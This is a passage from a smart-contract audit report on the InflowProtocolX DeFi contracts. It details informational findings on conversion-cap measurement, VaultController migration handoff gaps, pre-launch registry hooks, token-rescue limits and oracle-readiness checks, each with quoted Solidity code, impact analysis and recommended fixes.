**(b) Conversion caps and the curve model use `balanceOf(pair)` instead of synced reserves.** `_legCaps()` sets each pool's per-round cap to `capBps` of `IERC20(ipxToken).balanceOf(pair)` (`ConversionModule.sol:472-478`), `_inputReserve()` feeds the same balance into `_legQuote()`'s curve impact on the TWAP quote (`ConversionModule.sol:625-630`), and `_ipxForStable()` reads it to size the seed leg (`ConversionModule.sol:462`). Yet the `capBps` NatSpec ("Per-cycle conversion cap in bps of each target pool's IPX reserve", `ConversionModule.sol:79`), the `DEFAULT_CONV_PAIR_CAP_BPS` NatSpec (`InflowConstants.sol:161-162`) and the `_legCaps()` comment define the cap against the IPX reserve, the `_inputReserve()` comment calls the balance "the input-side reserve used by the conversion cap" (`ConversionModule.sol:625-626`), and `_legQuote()`'s spot side reads `getReserves()` through the router's `getAmountsOut()`. Code and documented cap thus diverge only while a pair holds unsynced IPX, which the caps and the model count but the spot quote does not; ordinary sells never leave any, as the token runs the cycle before the seller's IPX reaches the pair (`IPXToken.sol:420-443`), so it takes a direct donation or a flash swap.

**(c) A dust WPLS leg values to 0 USD, so `deploy()` returns false after locking LP.** `_addLiquidityWpls()` locks its LP, then reports `_wplsToUsdc(amountB)`, which divides down to stable-wei (`LiquidityDeployer.sol:514-517`). With the owner-managed reserve wallet's IPX balance or allowance at dust, the clamp shrinks the IPX leg, and the WPLS re-derived from it (`LiquidityDeployer.sol:473-479`) can be worth under one stable-wei while `_canMintLiquidity()` still sees at least one LP wei, so locked LP is valued at 0. If the stable and rail legs also place nothing, likely as the stable leg clamps against the same drained wallet, `placedUsd` is 0, no treasury cut is earned, and `deploy()` returns `placedUsd + treasuryPaid > 0` (`LiquidityDeployer.sol:308`), false, although its NatSpec says `didDeploy` is true when the call "actually moved deployment capital" (`LiquidityDeployer.sol:225-227`). The VaultController then treats it as a no-deploy cycle, skipping the post-deploy re-read of D, re-reading B only if an earlier expansion seed in the cycle changed POL, and emitting `CycleExecuted` with `deployed = false` (`VaultController.sol:613-625`), while `LpAdded` (`LiquidityDeployer.sol:516`) and `Deployed` (`:307`) still fire, keeping the dust LP visible off-chain. I-19 covers the inverse case: success events for rounds that placed nothing.

## Location of Affected Code

Sub-section 1: the clamp parks rail at the reserve wallet, but the full stable is still reported:

File: [src/ExpansionModule.sol#L591-L628](https://github.com/InflowProtocolX/Audit-InflowProtocolX/blob/35b939c1e8c54c7d3c7c693eaf13035998306cff/src/ExpansionModule.sol#L591-L628)

```solidity
    if (ipxAmount > available) {
        uint256 scaledTokenAmount = (tokenAmount * available) / ipxAmount;
        // code
        uint256 leftover = tokenAmount - scaledTokenAmount;
        if (leftover > 0) {
            IERC20(rail).safeTransfer(reserveWallet, leftover);
        }
// code
return usdStable;
```

## Impact

In sub-section 1, the parked rail is under 4.8% of a per-cycle slice's purchase on the direct route and under about 9.3% through WPLS, slightly more for a first seed into a dusted pair, where `_correctDustPair()` may first take up to 1% of the leg from the reserve, so the rail pair's POL and B grow slightly less than the stable spent implies. In the treasury stage, when the other legs place less than planned, the treasury cut is over-scaled by at most 4.5% of the overstated amount, the slice being capped at 4% of the deploy (`LiquidityDeployer.sol:352-355`) and the other planned legs at least 8/9 of the stable budget. Only a better fill for the protocol triggers this, and the parked rail and any overpay stay with the protocol's own multisig and treasury wallet.

In sub-section 2, the overstated figures only drive the stage gates: B sums `polUsd()` over the base and rail pairs, and `checkExpansion()` reads per-rail POL through `ExpansionModule._railPolAtLeast()` for the previous-rail gate and the treasury's pHEX gate. With one-way rail and treasury flags (`ExpansionModule.sol:329-330`), if all are active at lock expiry only `getB()`, `polUsd()` and the B in `CycleExecuted` read wrong; otherwise a stage still inactive more than 15 years after launch can activate before the registered depositors' LP reaches its threshold, a rail opening spending its already-reserved protected seed and locking the LP back into the LpLocker, a treasury activation turning on its slice of at most 4% of later deploy budgets: intended protocol allocations made early, not a loss. Nothing is stolen, the third party's LP is simply surrendered to a multisig-controlled locker, and the broken guarantee is stated only in developer NatSpec.

In sub-section 3, the rounding loosens each deviation gate by under one basis point, with no profitable path, and tests, invariant checks or monitoring built on the documented, reserve-based cap would flag false violations. A donation moves the cap by only `capBps` of itself (raising it by 1 IPX costs about 400 IPX at the default 25 bps) and, when the cycle then swaps on that pair, becomes extra input to the protocol's own swap, as the fee-on-transfer router call (`ConversionModule.sol:510`) takes the pair's balance minus its reserve as input; lowering the balance takes a flash swap of nearly all the pair's IPX, paying the swap fee and the buy tax (0.5% by default) on it, while any leg the cycle submits on the locked pair fails and rolls the cycle back, so at most one round shrinks. The dust leg skews that cycle's `CycleExecuted` figures by a few stable-wei at most; D and B are local to the cycle and the cooldown keys on the converted amount, not on `deployed`, so only the event is affected and the next cycle reads fresh state.

The issue is Informational: no outsider can profit, no funds are at risk, and the worst outcomes (a still-inactive stage activating early, a mis-set event flag, a code-NatSpec mismatch) need unlikely conditions.

## Recommendation

1. Have `contributeToRail()` return the stable actually placed, for example `usdStable * b / received`, recording the rail received right after the swap, before the reserve clamp reassigns `tokenAmount`, with `b` the rail the add took (zero on the exits that send all the rail to the reserve wallet). Update the `@return` NatSpec at `ExpansionModule.sol:524` and the `IExpansionModule` interface. `_try()` should keep returning the full withdrawal, which the VaultController uses to debit the protected seed.

   Use the smaller figure only to scale the treasury cut. `deploy()`'s return value also derives from `placedUsd` (`LiquidityDeployer.sol:308`), and the VaultController re-reads D only when it is true (`VaultController.sol:621-624`), because deployment has moved capital out of the vault, so keep it tied to that capital: a slice that withdrew stable but placed nothing still counts as a deployment. Sub-section 3(c) covers a related case where it is false although LP was minted.

   To keep the current behaviour, state in the `deploy()` comments that rail legs report the stable withdrawn rather than placed.

   Headroom in the `_planSeed()` reserve check is no substitute: the comment at `ExpansionModule.sol:950-956` explains a 5% pad was removed because it skipped seeds the reserve could have funded, and on the WPLS route even 5% would not cover the bound.

2. Debit attribution on withdrawal, in one of two forms.

   (a) More robust: a per-token `withdrawn` total that `withdraw()` increments and `_protocolLp()` subtracts, saturating at zero, from the registered depositors' sum before the balance cap. Withdrawals can exceed that sum (as when the multisig also sweeps the third-party LP in sub-section 2), and an underflow would revert `_calculateB()` at the start of every cycle (`VaultController.sol:437`), so every taxed sell would end in a failed cycle and every `poke()` would revert. Subtracting every withdrawal also charges a returned third-party transfer against the protocol, erring towards under-valuing POL.

   (b) Weaker: a debit against a named depositor, which changes the `withdraw()` signature, must be capped at that depositor's entry rather than revert (plain-transfer LP has no entry), and is only as accurate as the depositor the multisig names.

   Either form needs the new getter or parameter in `ILocker` and has to ship before deployment, as the Locker has no upgrade path (`Locker.sol:15`) and the migration playbook keeps the same LpLocker across generations. Otherwise, document the post-unlock limitation and correct the NatSpec at `Locker.sol:46-48` and `VaultController.sol:1273-1275` and `1343-1347`.

3. Fix the three measurements in sub-section 3:

   (a) Round each gate's deviation up with its own denominator, for example `Math.mulDiv(diff, 10_000, base, Math.Rounding.Ceil)`, as the ConversionModule's `_deviationBps()` already does for its TWAP-based denominator, in the gates listed in sub-section 3(a), where an over-band reading declines a leg or skips the cycle; change `_twapManipulationCheck()` and `_twapManipulationCheckView()` together so `getD()` keeps reporting what the cycle does (`src/VaultController.sol:1084-1087`). If I-08 moves a gate to the smaller of the two prices as its denominator, round that new form up too. Do not extend this to the ArbitrageMonitor's zone deviations, where a larger figure selects a zone, NEUTRAL is the fail-closed side (`src/ArbitrageMonitor.sol:233-238`) and rounding down is already conservative.

   (b) Read `getReserves()` instead of `balanceOf(pair)` in `_legCaps()`, `_inputReserve()` (which feeds the curve model in `_legQuote()`) and `_ipxForStable()` together: `_ipxForStable()` inverts the curve that `_legQuote()` applies, so switching only the caps and the quote would size the seed leg from one reserve figure and check it against another. As a V2 pair updates its reserves only at the end of a swap, a flash swap could then no longer shrink the caps either. Update the `_inputReserve()` comment (`src/ConversionModule.sol:625-626`) to match, or else keep the balance reads and reword the `capBps`, `DEFAULT_CONV_PAIR_CAP_BPS` and `_legCaps()` NatSpec to call the cap a share of the pair's IPX balance.

   (c) Have each leg report whether it minted LP, and return true from `deploy()` whenever any leg did, for example by tracking `lp > 0` alongside the placed USD.

## Team Response

Fixed.

# [I-12] State Carried Across a VaultController Migration Can Be Incomplete or Misreported

## Severity

Informational Risk

## Description

A VaultController migration leaves the oracle's controller pointer and the cooldown clocks behind, and the events and NatSpec around the state it does carry misdescribe it, so the successor starts with a stale oracle authorisation and reset clocks while monitoring reads floors and activation flags that differ from those in force.

### 1. Migration leaves the oracle's controller pointer and the cooldown clocks behind, and reports pre-merge floors

**(a) `TWAPOracle.vaultController` is a stored pointer that migration does not update.** `registerPairFromExpansion()` authorises `msg.sender` against `IVaultController(vaultController).expansionModule()` before the early return for registered pairs, so every call is checked. Only the owner's `setVaultController()` (`TWAPOracle.sol:239-243`), callable repeatedly and accepting `address(0)`, changes the stored `vaultController`, never `executeVaultControllerMigration()`. Until it is repointed, the successor's ExpansionModule is rejected and the revert is caught (`ExpansionModule.sol:1414-1420`): contributions to active rails and seeds into IPX/rail pairs that already hold liquidity are skipped without a revert, and a freshly seeded rail pair's best-effort registration (`ExpansionModule.sol:820-822`) is swallowed, leaving it without a TWAP until, after the repoint, a later call registers it and its first window matures. The in-code documentation says no admin call is needed: the pointer is "Read live so a migration to a successor VC (with a fresh ExpansionModule) does not require reregistering the oracle. Set once by owner." (`TWAPOracle.sol:66-71`), and `TWAPOracle.sol:265-270`, `ExpansionModule.sol:1401-1404` and the deploy script (`script/Deploy.s.sol:294-296`) say the same of the successor's ExpansionModule. Only `docs/MIGRATION_PLAYBOOK.md` is right: step 7.2, "Repoint the TWAP oracle at the successor (same batch as 7.1)", calls `oracle.setVaultController(address(newVC))`, and Phase 8 checks `oracle.vaultController() == newVC`; the rest of the documentation calls that step unnecessary.

**(b) Migration resets the conversion cooldown and the partial-round clock.** `handoffTo()` (`VaultController.sol:879-944`) passes the floor state, progression flags, POL depositor registry and, when the stable is unchanged and arrives, the protected seed, but not `lastExecutionTime` (`VaultController.sol:116`). The successor's zero `lastExecutionTime` means no cooldown to `_inCooldown()` (`VaultController.sol:1474-1477`), and its fresh ConversionModule's zero `lastPartialRoundAt` (`ConversionModule.sol:98`) means no partial round used to `_partialRoundUsed()` (`ConversionModule.sol:569-571`), so the first cycles after a migration escape the predecessor's 30-minute cooldown and its one-partial-round-per-period cap, which the README states as a bound: "A seller can therefore redirect at most one round to WPLS per cooldown period" (`README.md:398-400`).

**(c) `FloorRatcheted` emitted from `receiveFloorState()` can report pre-merge stage floors.** `handoffTo()` calls `successor.receiveFloorState()` (`VaultController.sol:888`) before `successor.receiveProgressionState()` (`VaultController.sol:917`). When `receiveFloorState()` raises `ipxFloor`, directly (`VaultController.sol:845-850`) or through `_ratchetIpxFloor()` on a higher peak (`VaultController.sol:1031-1034`), it emits `FloorRatcheted(ipxFloor, wplsFloor(), stableFloor())`, whose floor getters (`VaultController.sol:698-705`) go through `activeStage()` (`VaultController.sol:676-679`) and so still see the pre-merge flags. If the merge advances the stage, for example because the predecessor opened a rail after the successor's ExpansionModule copied its flags at construction (`ExpansionModule.sol:237-243`), the event reports the earlier stage's floors, not those in force when the transaction ends.

### 2. Activation carry and sync events fire unconditionally, and TreasuryController's NatSpec promises a reset that a wired migration cannot perform

`TreasuryController` emits `ActivationCarried` from its constructor for any non-zero `_predecessor` and `ActivationSynchronized` from every migration-time `syncActivationFrom()` call, both even when the predecessor is inactive and nothing changes, and neither path emits `TreasuryActivated` when the merge does turn activation on (`TreasuryController.sol:80-83`, `TreasuryController.sol:142-151`). `ExpansionModule`'s carry and sync events are unconditional in the same way (`ExpansionModule.sol:240-243`, `ExpansionModule.sol:266-270`).

The NatSpec "once activated, treasury stays on unless the multisig migrates via a fresh controller" (`TreasuryController.sol:15-17`), repeated in the closing comment (`TreasuryController.sol:153-156`), describes a reset that a wired successor cannot perform: `handoffTo()` always calls `receiveProgressionState()` (`VaultController.sol:917`), which syncs the successor's TreasuryController through `syncActivationFrom()` whenever both addresses are set (`VaultController.sol:814-816`). A fresh controller therefore resets activation only if it was built with no predecessor and wired after the handoff, an ordering that execution does not reject (see I-17), or if a successor VaultController implementation skips the merge.

## Location of Affected Code

Every registration is authorised against the stored controller pointer, before the early return for registered pairs (sub-section 1):

File: [src/TWAPOracle.sol#L271-L277](https://github.com/InflowProtocolX/Audit-InflowProtocolX/blob/35b939c1e8c54c7d3c7c693eaf13035998306cff/src/TWAPOracle.sol#L271-L277)

```solidity
function registerPairFromExpansion(address pair) external {
    if (vaultController == address(0)) revert VaultControllerNotSet();
    address expMod = IVaultController(vaultController).expansionModule();
    if (msg.sender != expMod) revert NotExpansionModule(msg.sender);

    Snapshot storage s = snapshots[pair];
    if (s.initialized) return; // idempotent
```

The migration-time sync emits `ActivationSynchronized` whether or not the merge changes anything, and never `TreasuryActivated` (sub-section 2):

File: [src/TreasuryController.sol#L142-L151](https://github.com/InflowProtocolX/Audit-InflowProtocolX/blob/35b939c1e8c54c7d3c7c693eaf13035998306cff/src/TreasuryController.sol#L142-L151)

```solidity
function syncActivationFrom(address predecessor) external {
    if (msg.sender != vaultController) revert NotVaultController(msg.sender);
    if (predecessor == address(0)) return;
    _mergeActivationFrom(predecessor);
    emit ActivationSynchronized(predecessor);
}

function _mergeActivationFrom(address predecessor) internal {
    if (ITreasuryController(predecessor).isActive()) isActive = true;
}
```

A successor with a TreasuryController wired always merges the predecessor's activation, so the reset promised by the NatSpec cannot happen there (sub-section 2):

File: [src/VaultController.sol#L814-L816](https://github.com/InflowProtocolX/Audit-InflowProtocolX/blob/35b939c1e8c54c7d3c7c693eaf13035998306cff/src/VaultController.sol#L814-L816)

```solidity
if (treasuryController != address(0) && predecessorTreasury != address(0)) {
    ITreasuryController(treasuryController).syncActivationFrom(predecessorTreasury);
}
```

## Impact

For sub-section 1, if the owner skips or delays the oracle step, `_twapPriceOkForExistingPair()` returns false and the rail flows of point (a) stop without any revert: fail-closed, nothing lost, and one owner call fixes it. Right after a migration, the successor can run at most one full and one partial round the predecessor's clocks would have blocked (the partial one only if a seller also pushes the stable pool off its TWAP so the stable side declines), each still limited by the per-pool conversion cap and the TWAP deviation bands, and `clearCooldown()` already lets the owner clear the cooldown at any time. Monitors can record an earlier stage's WPLS and stable floors, though on-chain state is correct once the progression merge runs.

For sub-section 2, monitors that watch `ActivationCarried` or `ActivationSynchronized` can read an activation that did not happen, monitors that watch `TreasuryActivated` miss an activation carried across a migration, and readers of the NatSpec expect a reset path that the playbook's wired migration never takes. The activation state itself is carried correctly.

This is Informational: each sub-section 1 effect needs a multisig-only migration with 30 days' notice (for the oracle gap, also a skipped playbook step) and is fail-closed, one-off or limited to event content, with no funds lost, and sub-section 2 concerns only event content and documentation.

## Recommendation

1. Oracle pointer, cooldown clocks and floor event (sub-section 1):
   - (a) Store the IPX token address on the oracle (a constructor argument, as the oracle is deployed after the token: `script/Deploy.s.sol:141` and `:297`) and resolve the controller through `IIPXToken(ipxToken).vaultController()`, which `executeVaultControllerMigration()` updates in the same transaction and `IPXToken.registerPair()` already uses for the ExpansionModule. This removes `setVaultController()`, so step 7.2 of `docs/MIGRATION_PLAYBOOK.md` and the matching Phase 8 check must change with it, or the removed call would revert step 7.2's batch, which includes the migration. At a minimum, move the authorisation check below the `initialized` early return, reject `address(0)` in `setVaultController()`, and correct the NatSpec and deploy-script comments.
   - (b) Start the successor in cooldown by setting `lastExecutionTime = block.timestamp` in an existing handoff hook such as `receiveFloorState()`, inheriting its caller check and the migration-only guard proposed in I-13. Every conversion, partial rounds included, needs the cooldown to have passed (`VaultController.sol:529`), so the successor's first round of either kind comes at least one `COOLDOWN_PERIOD` after the predecessor's last, which also keeps the one-partial-round-per-period bound without touching the ConversionModule; the cost is up to 30 minutes without conversion right after a migration, even when the predecessor was idle. To keep the exact clocks instead, carry `lastExecutionTime` and the predecessor ConversionModule's `lastPartialRoundAt` through the handoff, with a ConversionModule setter that only its VaultController can call, both clamped to `block.timestamp`, since a future `lastExecutionTime` keeps `_inCooldown()` true, or makes it overflow and revert, stopping conversion on every cycle.
   - (c) Call `receiveProgressionState()` before `receiveFloorState()`; both run while the predecessor is still the token's controller, so authorisation is unaffected. Alternatively, emit a corrected `FloorRatcheted` after the progression merge.

2. Activation events and NatSpec (sub-section 2):
   - (a) Emit the carry and sync events, or `TreasuryActivated`, only when activation changes from false to true.
   - (b) Correct the NatSpec and the closing comment in `TreasuryController`: once execution requires the successor's modules to be wired and locked (see I-17), no migration can reset treasury activation, so the promised reset through a fresh controller must go; until then, state that only a successor executed without a wired TreasuryController can reset it. A wanted reset should be a deliberate option declared when the migration is queued, so it carries the 30-day notice; a direct owner call would be a new power over state the code presents as one-way.

## Team Response

Fixed.

# [I-13] Migration Hooks and the IPX/WPLS Rescue Block Ignore the Vault's Migration Status, so `lockModules()` Does Not Close the POL Depositor Registry Before Launch and a Retired Vault's IPX and WPLS Cannot Be Rescued

## Severity

Informational Risk

## Description

Two VaultController checks built around controller migration ignore the vault's migration status: the `receive*` hooks accept state from whatever contract the token currently names as its controller without checking that a migration to this vault is in progress, and the IPX and WPLS block in `rescueToken()` applies whether or not the vault has been retired. As a result, before launch the owner can still add POL depositors after `lockModules()`, and IPX and WPLS left in a retired vault have no practical way out.

### 1. The `receive*` hooks are reachable outside a migration before launch, so `lockModules()` does not close the POL depositor registry until trading opens

Before launch, the owner can add addresses to a VaultController's POL depositor registry after `lockModules()`, even though the code states the lock closes it. The hole is the migration hook `receivePolDepositors()`, which accepts a call from whatever address the token currently names as its controller.

`receivePolDepositors()` and the other three migration hooks, `receiveProtectedSeed()` (`VaultController.sol:788-796`), `receiveProgressionState()` (`VaultController.sol:809-818`) and `receiveFloorState()` (`VaultController.sol:845-859`), exist so that a predecessor can pass its state to a successor inside `executeVaultControllerMigration()`. Their only gate is `_requireCurrentVaultController()` (`VaultController.sol:946-952`), which checks that `msg.sender` equals `IIPXToken(ipxToken).vaultController()`. None of them checks `modulesLocked`, `tradingOpen`, or whether a migration is in progress.

After launch, that gate is enough: the token's controller then changes only inside `executeVaultControllerMigration()`, and the only caller of the hooks is `handoffTo()`. Before launch, it is not. `IPXToken.setVaultController()` (`IPXToken.sol:134-145`) lets the owner point the token, with no delay, at any contract that implements the three module getters. A helper contract H whose getters return zero passes `_grantVCExemptions()` and becomes the current controller:

1. The owner calls `ipx.setVaultController(H)`.
2. H calls `VC.receivePolDepositors([X])`, which appends X to the registry. From then on, LP that X locks in the LpLocker counts toward B.
3. The owner calls `ipx.setVaultController(VC)` and then `openTrading()`.

The direct path, `addPolDepositor()`, reverts once `lockModules()` has run, and the code says the registry is meant to stay closed after that: the `addPolDepositor()` NatSpec says it is "Closed by `lockModules()` together with the module wiring, because the registry decides what B is made of", and `script/Deploy.s.sol:195-199` registers the launch depositor before the lock because "the registry closes with lockModules". Before launch, that statement does not hold.

### 2. A retired vault's IPX and WPLS cannot be rescued

`VaultController.rescueToken()` refuses IPX and WPLS even on a vault that is no longer the token's controller, so IPX and WPLS left in a retired vault have no practical way out. This affects the launch inventory if the owner rotates the controller before launch after the vault has been funded, and any IPX or WPLS that a third party mistakenly transfers to a vault after its migration handoff.

`rescueToken()` reverts for `ipxToken` and `wpls` whether or not the vault is current; only the stable block depends on `_isCurrentVaultController(address(this))`. The NatSpec gives the reason for the stable exception: once a vault is retired, its stable becomes rescuable so that a balance that `handoffTo()` could not move can still be recovered. A failed handoff cannot leave IPX or WPLS behind, because `handoffTo()` transfers both with hard calls and the migration reverts if either fails. They can still reach a retired vault in the two ways below, and there the same recovery reasoning applies.

A retired vault has no other way to move these tokens. Its modules are locked by the deploy script (`script/Deploy.s.sol:367`) in the same broadcast that funds it, `withdrawTo()` is module-only, and the modules call it only from inside a cycle, which a retired vault cannot run:

- `checkAndExecute()` is `onlyToken`, and the token calls only its current controller.
- `poke()` reverts with `TradingNotOpen` before launch.
- After launch, `_runCycle()` calls `IPXToken.setInSwap()`, which accepts only the current controller.

`handoffTo()` is `onlyToken` and moves only the balances present at the moment of migration. The tokens can end up there in two ways:

**(a) Pre-launch rotation.** The repository's deploy script calls `ipx.setVaultController(vault)` (`script/Deploy.s.sol:203`) and then funds that vault with 60M IPX (`script/Deploy.s.sol:228`) and the WPLS seed (`script/Deploy.s.sol:244`). The owner may still choose to rotate afterwards: `setVaultController()` stays re-settable until trading opens, as its NatSpec says (`IPXToken.sol:126-127`). If the owner then points the token at a new VaultController B, the first vault A gets no `handoffTo()`, and `rescueToken(ipx)` or `rescueToken(wpls)` on A reverts; only A's stable seed can be rescued. A's IPX and WPLS can be put back to use by pointing the token back at A (one owner call). Otherwise they reach B only through migrations: by launching on A and migrating to B after the 30-day timelock or, if B has already launched, by migrating B to A and back (two 30-day timelocks). Only if the owner had rotated before A's modules were locked, contrary to the deploy flow, could it instead rewire A to a module that calls `withdrawTo()` directly.

**(b) After a migration.** No protocol path sends IPX or WPLS to a retired vault: tax goes to the current `vaultController` (`IPXToken.sol:415`), and module refunds happen only inside the current vault's cycle. Tokens arrive there only through a third party's mistaken transfer. The only route out is to migrate the token back to that vault, a full 30-day migration, which is not a realistic recovery path.

## Location of Affected Code

Sub-section 1: `receivePolDepositors()` appends to the registry behind only the current-controller check, with no lock or migration check:

File: [src/VaultController.sol#L828-L835](https://github.com/InflowProtocolX/Audit-InflowProtocolX/blob/35b939c1e8c54c7d3c7c693eaf13035998306cff/src/VaultController.sol#L828-L835)

```solidity
function receivePolDepositors(address[] calldata depositors) external {
    _requireCurrentVaultController();
    uint256 n = depositors.length;
    for (uint256 i; i < n; ++i) {
        _appendPolDepositor(depositors[i]);
    }
    emit PolDepositorsReceived(msg.sender, n);
}
```

Sub-section 1: the owner path to the same registry is closed by `lockModules()`, and its NatSpec says why:

File: [src/VaultController.sol#L297-L308](https://github.com/InflowProtocolX/Audit-InflowProtocolX/blob/35b939c1e8c54c7d3c7c693eaf13035998306cff/src/VaultController.sol#L297-L308)

```solidity
/// @notice Register an address whose LpLocker deposits count as
///         protocol-owned liquidity, for LP that does not arrive
///         through a module: the launch LP is deposited by the
///         deployer before trading opens. Closed by `lockModules`
///         together with the module wiring, because the registry
///         decides what B is made of.
/// @param  depositor Address that deposits LP into the LpLocker.
function addPolDepositor(address depositor) external onlyOwner {
    if (modulesLocked) revert ModulesAlreadyLocked();
    if (depositor == address(0)) revert ZeroAddress();
    _appendPolDepositor(depositor);
}
```

Sub-section 2: IPX and WPLS are blocked unconditionally, while the stable block applies only to the current vault:

File: [src/VaultController.sol#L373-L383](https://github.com/InflowProtocolX/Audit-InflowProtocolX/blob/35b939c1e8c54c7d3c7c693eaf13035998306cff/src/VaultController.sol#L373-L383)

```solidity
function rescueToken(address token, address to, uint256 amount) external onlyOwner {
    if (to == address(0)) revert ZeroAddress();
    if (token == ipxToken) revert RescueBlocked();
    if (token == wpls)     revert RescueBlocked();
    // The live vault's stable backs its floor and protected seed; only a
    // retired vault (after migration) may release it, and there it is
    // otherwise unrecoverable when the handoff's stable leg failed.
    if (token == stable && _isCurrentVaultController(address(this))) revert RescueBlocked();
    IERC20(token).safeTransfer(to, amount);
    emit Rescued(token, to, amount);
}
```

Sub-section 2: the rationale for the stable exception, which exists only for retired vaults:

File: [src/VaultController.sol#L359-L362](https://github.com/InflowProtocolX/Audit-InflowProtocolX/blob/35b939c1e8c54c7d3c7c693eaf13035998306cff/src/VaultController.sol#L359-L362)

```solidity
///         Exception: once this vault is no longer the token's current
///         VaultController, its own `stable` becomes rescuable, so a
///         stable that `handoffTo` could not move (frozen, blacklisted)
///         can be sent on after the freeze ends.
```

## Impact

In sub-section 1, holders who checked the registry after `lockModules()` can find extra POL depositors at launch. Only the owner can add them, only before trading opens, and every step is visible on-chain (`VaultControllerUpdated`, `PolDepositorAdded`, `PolDepositorsReceived`). No funds move, and the hook path gives the owner no capability it lacks today. A registry entry cannot create B out of nothing: `_protocolLp()` caps attribution at the LP actually held in the LpLocker, so raising B through X still means locking real LP for 15 years. The launch depositor registered at `script/Deploy.s.sol:199` stays in the registry, and `Locker.deposit()` is permissionless (`src/lockers/Locker.sol:88-94`), so that address can already lock more LP that counts toward B at any time. More broadly, until trading opens, the owner may point the token at an entirely different VaultController (`IPXToken.sol:126-128`), whose IPX floor, module predecessors and depositor registry it chooses freely before that contract's own `lockModules()`; the hooks only add that the state of the same VaultController address can still change after its own `lockModules()`. In sub-section 2, no user funds are at risk and nothing can be taken. Case (a) needs the owner to rotate the controller before launch after funding the vault, and it leaves the 60M IPX and the WPLS seed usable only through the original vault, which the owner can restore with one call. Case (b) affects only tokens that someone sends to a retired vault by mistake, and only that sender bears the loss.

The issue is Informational. Sub-section 1 needs a deliberate action by the trusted owner before trading opens, cannot be reached outside a migration once trading is open, and contradicts only the NatSpec and deploy-script comment, with no funds at risk and no new owner capability. Sub-section 2 describes recovery gaps that touch no user or protocol accounting: case (a) needs the trusted owner to act against the deploy flow and is undone with one call, and case (b) needs a third party's mistaken transfer.

## Recommendation

1. In each `receive*` hook, also require that a migration to this contract is in progress. For example, check `IPXToken.pendingVaultController() == address(this)` after adding the getter to `IIPXToken`. `pendingVaultController` is set only by `queueVaultControllerMigration()`, which requires trading to be open, so it is always zero before launch. It is still set when `handoffTo()` calls the successor's hooks.

```solidity
function _requireMigrationHandoff() internal view {
    _requireCurrentVaultController();
    IIPXToken token = IIPXToken(ipxToken);
    if (!token.tradingOpen() || token.pendingVaultController() != address(this)) {
        revert NotInMigration();
    }
}
```

2. Allow IPX and WPLS rescue from a vault that is no longer current, mirroring the stable exception, but only after trading opens and only to the current VaultController:

```solidity
bool current = _isCurrentVaultController(address(this));
if (token == ipxToken || token == wpls) {
    if (current || !IIPXToken(ipxToken).tradingOpen()) revert RescueBlocked();
    if (to != IIPXToken(ipxToken).vaultController()) revert RescueBlocked();
}
if (token == stable && current) revert RescueBlocked();
```

Both limits matter. Before launch, the owner can point the token at any contract without delay (see sub-section 1 above), so a pre-launch exception, even one restricted to the current controller, would let the owner move the vault's launch inventory anywhere. After launch, the current controller changes only through the 30-day migration, so sending the tokens there is safe, and it also recovers a pre-launch rotation once trading opens on the new vault. Before launch, the simplest remedy is operational: do not rotate the controller after funding the vault, or point the token back at the funded vault.

## Team Response

Fixed.

# [I-14] The `openTrading()` Oracle Gate Checks Less Than Its Comment Claims, and the `TWAPOracle` Pair-Registry Functions Check Less Than Their Purpose Requires

## Severity

Informational Risk

## Description

The oracle-wiring checks validate less than they claim or than their purpose requires: trading can open with the LP deviation gate off, and the pair registry can let a kept TWAP go stale before a restarted window completes, or fail to retire a pair the ExpansionModule evaluates.

### 1. The `openTrading()` readiness gate checks less than its comment claims

`IPXToken.openTrading()` checks only the VaultController's oracle (a non-zero `vc.twapOracle()`, three non-zero pairs and a completed window for each), which covers the IPX leg of D, the manipulation guard and the locked-POL valuation. Its comment also says the LP deviation gate and the rail preflight are then "actually active", but those read their modules' own `twapOracle` pointers, each set by the module's own `setTWAPOracle()` (`LiquidityDeployer.sol:139-147`, `ExpansionModule.sol:257-261`, read at `ExpansionModule.sol:1158`) independently of `VaultController.setTWAPOracle()` (`VaultController.sol:245-249`), and `openTrading()` reads neither.

With the LiquidityDeployer's pointer at zero, `_twapGuard()` returns `LpDecline.None` (`LiquidityDeployer.sol:698-701`) and every base LP add skips its 5% spot-vs-TWAP check, a mode the NatSpec calls "bootstrap only - should not run this way in production"; without the check, it notes, "the LP add would have filled at a manipulated price and the slippage minimums (self-derived from spot) would not catch it."

Other cycle checks only partly cover this. The VaultController's anchor guard watches only the WPLS/stable pair, and deployment needs a completed, non-partial conversion in the same cycle: on IPX/stable, a push of more than 10% off TWAP declines the stable conversion leg (`maxLegDeviationBps`), leaving the round partial and nothing deployed, so the add tolerates up to about 10% skew instead of 5%; on IPX/WPLS, a declined WPLS leg still completes the round (`ConversionModule.sol:273-277`), so only an upward push of more than 5% is still caught (by the momentum gate that blocks conversion), not one making IPX cheaper.

A zero ExpansionModule pointer fails closed instead: `_twapRouteOut()` returns zero, `_planSeed()` skips the rail with nothing moved, and no rail opens until it is set.

### 2. Two `TWAPOracle` pair-registry functions fall short of their documented effect

**(a) `setBasePairs()` keeps the old pin's staleness clock running, so the documented continuity can lapse before the first joint pin.** The restart itself is documented: the dev note (`TWAPOracle.sol:203-204`) and steps 3.2 and 7.2 of `docs/MIGRATION_PLAYBOOK.md` say every member's window begins again, so a completed window is at least `windowSeconds` away. The NatSpec (`TWAPOracle.sol:199-202`) and step 7.2 (`docs/MIGRATION_PLAYBOOK.md:489-491`) add that the kept averages bridge that gap, so consumers "keep reading the last completed window until the first joint pin replaces it". That holds only while each kept pin stays fresh. `_rebaseline()` (`TWAPOracle.sol:392-400`) leaves `lastUpdateAt` untouched, and `hasCompletedWindow()` and `consult()` measure staleness from it (`TWAPOracle.sol:421`, `:455`), yet no pin can land for `windowSeconds` after the call: `update()` reverts with `PeriodNotElapsed`, and the cycle's refresh finds `canUpdate()` false. A pin older than `maxTwapStaleness - windowSeconds` at the call therefore expires first, and consumers needing a fresh completed window fail closed until the first joint pin, for at most one window: with the default 2-hour window and 4-hour staleness limit, for as long as the pin was overdue; with the 1-hour window `docs/LAUNCH_PLAYBOOK.md` sets after launch, which leaves the limit at 4 hours, only once a pin is more than 2 hours overdue, and for at most 1 hour.

